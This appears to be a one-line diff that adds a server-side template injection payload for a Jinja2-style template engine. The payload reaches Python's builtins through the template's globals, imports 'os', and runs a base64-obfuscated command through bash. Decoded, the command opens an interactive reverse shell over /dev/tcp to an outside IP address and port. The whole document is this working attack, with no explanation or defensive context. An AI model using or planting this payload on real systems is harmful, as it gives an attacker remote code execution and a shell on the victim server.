@@ -1,0 +1,1 @@
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjQ2LzI0MjQgMD4mMSAK | base64 -d | bash').read() }}
